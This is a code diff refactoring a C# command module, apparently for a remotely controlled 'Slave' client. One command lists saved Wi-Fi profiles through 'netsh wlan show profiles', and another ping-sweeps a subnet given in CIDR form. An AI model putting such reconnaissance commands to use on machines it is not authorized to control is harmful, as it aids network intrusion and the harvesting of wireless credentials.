@@ -24,16 +24,16 @@ namespace Slave.Commands
         {
             if (args[0] == "wifi")
             {
-                Wifi();
+                WifiInfos();
             }
             else
             {
-                Scan(args);
+                Scan(args[1]);
             }
         }
 
 
-        void Wifi()
+        void WifiInfos()
         {
             // Get wifi profiles names
             var cmd = "/C netsh wlan show profiles";
@@ -73,15 +73,16 @@ namespace Slave.Commands
         }
 
 
-        void Scan(List<string> args)
+        void Scan(string ipMask)
         {
             upHosts.Clear();
             countdown = new CountdownEvent(1);
 
-            var ipRange = GetIpRange(args[1]);
-
-            foreach (var ip in ipRange)
+            var firstAndLastIpInt = GetFirstAndLastIpInt(ipMask);
+            for (int i = firstAndLastIpInt.Item1; i <= firstAndLastIpInt.Item2; i++)
             {
+                var bytes = BitConverter.GetBytes(i);
+                var  ip = new IPAddress(new[] { bytes[3], bytes[2], bytes[1], bytes[0] });
                 var ping = new Ping();
                 ping.PingCompleted += PingCompletedEventHandler;
 
@@ -108,28 +109,14 @@ namespace Slave.Commands
         }
 
 
-        #region Ip range calculation
-
-        static IEnumerable<IPAddress> GetIpRange(string ipAndMask)
+        #region Ip calculations
+        
+        static Tuple<int, int> GetFirstAndLastIpInt(string ipAndMask)
         {
             var separatorPos = ipAndMask.IndexOf('/');
-            var baseIp = ipAndMask.Substring(0, separatorPos);
-            var mask = int.Parse(ipAndMask.Substring(separatorPos + 1));
+            var stringIp = ipAndMask.Substring(0, separatorPos);
+            var bits = int.Parse(ipAndMask.Substring(separatorPos + 1));
 
-            var firstAndLaspIp = GetFirstAndLastIpByteArray(baseIp, mask);
-            var first = ByteArrayIpToInt(firstAndLaspIp.Item1);
-            var last = ByteArrayIpToInt(firstAndLaspIp.Item2);
-
-            for (int i = first; i <= last; i++)
-            {
-                var bytes = BitConverter.GetBytes(i);
-                yield return new IPAddress(new[] { bytes[3], bytes[2], bytes[1], bytes[0] });
-            }
-        }
-
-
-        static Tuple<byte[], byte[]> GetFirstAndLastIpByteArray(string stringIp, int bits)
-        {
             var ip = stringIp.Split('.').Select(x => (byte)int.Parse(x)).ToArray();
             uint mask = ~(uint.MaxValue >> bits);
 
@@ -146,7 +133,7 @@ namespace Slave.Commands
                 endIPBytes[i] = (byte)(ip[i] | ~maskBytes[i]);
             }
 
-            return new Tuple<byte[], byte[]>(startIPBytes, endIPBytes);
+            return new Tuple<int, int>(ByteArrayIpToInt(startIPBytes), ByteArrayIpToInt(endIPBytes));
         }
 
 
@@ -156,6 +143,6 @@ namespace Slave.Commands
             return BitConverter.ToInt32(array, 0);
         }
 
-        #endregion Ip range calculation
+        #endregion Ip calculations
     }
 }
